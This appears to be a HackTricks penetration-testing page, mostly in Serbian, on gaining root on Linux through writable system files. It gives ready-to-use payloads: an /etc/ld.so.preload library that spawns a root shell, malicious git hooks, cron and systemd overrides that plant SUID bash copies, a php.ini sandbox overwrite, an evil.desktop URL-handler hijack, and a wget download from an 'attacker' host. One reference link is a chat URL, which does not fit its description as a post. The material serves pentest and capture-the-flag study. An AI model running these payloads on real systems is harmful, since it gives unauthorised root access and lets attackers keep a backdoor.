# Arbitrarno pisanje fajla u root

{{#include ../../banners/hacktricks-training.md}}

### /etc/ld.so.preload

Ova datoteka se ponaša kao **`LD_PRELOAD`** env promenljiva, ali takođe funkcioniše i u **SUID binaries**.\
Ako možete da je kreirate ili izmenite, jednostavno možete dodati **putanju do biblioteke koja će biti učitana** pri svakom izvršenom binarnom fajlu.

Na primer: `echo "/tmp/pe.so" > /etc/ld.so.preload`
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unlink("/etc/ld.so.preload");
setgid(0);
setuid(0);
system("/bin/bash");
}
//cd /tmp
//gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
### Git hooks

[**Git hooks**](https://git-scm.com/book/en/v2/Customizing-Git-Git-Hooks) su **skripte** koje se **pokreću** pri raznim **događajima** u git repozitorijumu, kao kada se napravi commit, merge... Dakle, ako **privilegovan skript ili korisnik** često izvode ove radnje i moguće je **pisati u `.git` direktorijum**, to se može iskoristiti za **privesc**.

Na primer, moguće je **generisati skriptu** u git repo-u u **`.git/hooks`** tako da se uvek izvršava kada se kreira novi commit:
```bash
echo -e '#!/bin/bash\n\ncp /bin/bash /tmp/0xdf\nchown root:root /tmp/0xdf\nchmod 4777 /tmp/b' > pre-commit
chmod +x pre-commit
```
### Cron & Vremenski fajlovi

Ako možete da **pišete cron-related fajlove koje root izvršava**, obično možete dobiti izvršavanje koda sledeći put kada se posao pokrene. Zanimljivi ciljevi uključuju:

- `/etc/crontab`
- `/etc/cron.d/*`
- `/etc/cron.hourly/*`, `/etc/cron.daily/*`, `/etc/cron.weekly/*`, `/etc/cron.monthly/*`
- root-ov sopstveni crontab u `/var/spool/cron/` ili `/var/spool/cron/crontabs/`
- `systemd` tajmeri i servisi koje oni pokreću

Brze provere:
```bash
ls -la /etc/crontab /etc/cron.d /etc/cron.hourly /etc/cron.daily /etc/cron.weekly /etc/cron.monthly 2>/dev/null
find /var/spool/cron* -maxdepth 2 -type f -ls 2>/dev/null
systemctl list-timers --all 2>/dev/null
grep -R "run-parts\\|cron" /etc/crontab /etc/cron.* /etc/cron.d 2>/dev/null
```
Tipični putevi zloupotrebe:

- **Dodajte novi root cron job** u `/etc/crontab` ili u fajl u `/etc/cron.d/`
- **Zameniti skriptu** koja se već izvršava pomoću `run-parts`
- **Backdoor an existing timer target** modifikovanjem skripte ili binarnog fajla koji pokreće

Primer minimalnog cron payload-a:
```bash
echo '* * * * * root cp /bin/bash /tmp/rootbash && chown root:root /tmp/rootbash && chmod 4777 /tmp/rootbash' >> /etc/crontab
```
Ako možete da pišete samo unutar cron direktorijuma koji koristi `run-parts`, ubacite izvršni fajl tamo umesto toga:
```bash
cat > /etc/cron.daily/backup <<'EOF'
#!/bin/sh
cp /bin/bash /tmp/rootbash
chown root:root /tmp/rootbash
chmod 4777 /tmp/rootbash
EOF
chmod +x /etc/cron.daily/backup
```
Napomene:

- `run-parts` obično ignoriše imena fajlova koja sadrže tačke, zato dajte prednost imenima kao `backup` umesto `backup.sh`.
- Neki distro-i koriste `anacron` ili `systemd` timers umesto klasičnog cron-a, ali ideja zloupotrebe je ista: **izmenite ono što će root kasnije izvršiti**.

### Service & Socket files

Ako možete da napišete **`systemd` unit files** ili fajlove na koje oni referenciraju, možda ćete moći da dobijete izvršavanje koda kao root tako što ćete ponovo učitati i restartovati unit, ili čekanjem da se pokrene putanja aktivacije service/socket.

Zanimljivi ciljevi uključuju:

- `/etc/systemd/system/*.service`
- `/etc/systemd/system/*.socket`
- Drop-in overrides in `/etc/systemd/system/<unit>.d/*.conf`
- Service scripts/binaries referenced by `ExecStart=`, `ExecStartPre=`, `ExecStartPost=`
- Writable `EnvironmentFile=` paths loaded by a root service

Brze provere:
```bash
ls -la /etc/systemd/system /lib/systemd/system 2>/dev/null
systemctl list-units --type=service --all 2>/dev/null
systemctl list-units --type=socket --all 2>/dev/null
grep -R "^ExecStart=\\|^EnvironmentFile=\\|^ListenStream=" /etc/systemd/system /lib/systemd/system 2>/dev/null
```
Uobičajeni putevi zloupotrebe:

- **Prepiši `ExecStart=`** u servis jedinici u vlasništvu root-a koju možeš izmeniti
- **Add a drop-in override** sa malicioznim `ExecStart=` i prvo ukloni stari
- **Backdoor the script/binary** koji je već referenciran u jedinici
- **Hijack a socket-activated service** modifikovanjem odgovarajuće `.service` datoteke koja se pokreće kada socket primi konekciju

Primer malicioznog override-a:
```ini
[Service]
ExecStart=
ExecStart=/bin/sh -c 'cp /bin/bash /tmp/rootbash && chown root:root /tmp/rootbash && chmod 4777 /tmp/rootbash'
```
Tipičan tok aktivacije:
```bash
systemctl daemon-reload
systemctl restart vulnerable.service
# or trigger the socket-backed service by connecting to it
```
Ako ne možete da restartujete servise sami, ali možete da izmenite socket-activated unit, možda će vam biti dovoljno samo da **sačekate konekciju klijenta** da bi se pokrenulo izvršavanje backdoored service kao root.

### Prepišite restriktivni `php.ini` koji koristi privilegovani PHP sandbox

Neki prilagođeni daemoni validiraju PHP koji dostavi korisnik tako što pokreću `php` sa **restriktivnim `php.ini`** (na primer, `disable_functions=exec,system,...`). Ako sandboxed code i dalje ima **any write primitive** (npr. `file_put_contents`) i možete da dohvatite **tačan put do `php.ini`** koji koristi daemon, možete **prepisati taj config** da uklonite restrikcije i zatim poslati drugi payload koji će se izvršiti sa povišenim privilegijama.

Typical flow:

1. First payload overwrites the sandbox config.
2. Second payload executes code now that dangerous functions are re-enabled.

Minimalni primer (zamenite put koji koristi daemon):
```php
<?php
file_put_contents('/path/to/sandbox/php.ini', "disable_functions=\n");
```
If the daemon runs as root (or validates with root-owned paths), the second execution yields a root context. This is essentially **privilege escalation via config overwrite** when the sandboxed runtime can still write files.

### binfmt_misc

Fajl koji se nalazi u `/proc/sys/fs/binfmt_misc` pokazuje koji binary treba da izvrši koji tip fajlova. TODO: proveriti zahteve za zloupotrebu ovog kako bi se izvršio rev shell kada je otvoren uobičajen tip fajla.

### Prepisivanje handlera šema (kao http: ili https:)

Napadač koji ima dozvole za pisanje u konfiguracionim direktorijumima žrtve može lako zameniti ili kreirati fajlove koji menjaju ponašanje sistema, što dovodi do nepredviđenog izvršavanja koda. Izmenom fajla `$HOME/.config/mimeapps.list` da usmeri HTTP i HTTPS URL handlere na zlonamerni fajl (npr. postavljanjem `x-scheme-handler/http=evil.desktop`), napadač obezbeđuje da **klik na bilo koji http ili https link pokrene kod naveden u tom `evil.desktop` fajlu**. Na primer, nakon postavljanja sledećeg zlonamernog koda u `evil.desktop` u `$HOME/.local/share/applications`, svaki klik na eksterni URL pokreće ugrađenu komandu:
```bash
[Desktop Entry]
Exec=sh -c 'zenity --info --title="$(uname -n)" --text="$(id)"'
Type=Application
Name=Evil Desktop Entry
```
Za više informacija pogledajte [**this post**](https://chatgpt.com/c/67fac01f-0214-8006-9db3-19c40e45ee49) gde je iskorišćen za eksploataciju stvarne ranjivosti.

### Root executing user-writable scripts/binaries

Ako privilegovani workflow pokreće nešto poput `/bin/sh /home/username/.../script` (ili bilo koji binary unutar direktorijuma koji je u vlasništvu neprivilegovanog korisnika), možete ga preuzeti:

- **Otkrivanje izvršavanja:** nadgledajte procese pomoću [pspy](https://github.com/DominicBreuker/pspy) da biste uhvatili root koji poziva putanje kontrolisane od strane korisnika:
```bash
wget http://attacker/pspy64 -O /dev/shm/pspy64
chmod +x /dev/shm/pspy64
/dev/shm/pspy64   # wait for root commands pointing to your writable path
```
- **Potvrdite upisivost:** uverite se da su i ciljani fajl i njegov direktorijum u vlasništvu i upisivi za vaš nalog.
- **Preuzmite kontrolu nad ciljem:** napravite rezervnu kopiju originalnog binarnog fajla/skripte i ubacite payload koji kreira SUID shell (ili bilo koju drugu root akciju), zatim vratite dozvole:
```bash
mv server-command server-command.bk
cat > server-command <<'EOF'
#!/bin/bash
cp /bin/bash /tmp/rootshell
chown root:root /tmp/rootshell
chmod 6777 /tmp/rootshell
EOF
chmod +x server-command
```
- **Pokrenite privilegovanu akciju** (npr. pritiskom na UI dugme koje pokreće helper). Kada root ponovo izvrši hijacked path, preuzmite eskalirani shell pomoću `./rootshell -p`.

## References

- [HTB Bamboo – hijacking a root-executed script in a user-writable PaperCut directory](https://0xdf.gitlab.io/2026/02/03/htb-bamboo.html)
- [HTB: Gavel](https://0xdf.gitlab.io/2026/03/14/htb-gavel.html)

{{#include ../../banners/hacktricks-training.md}}
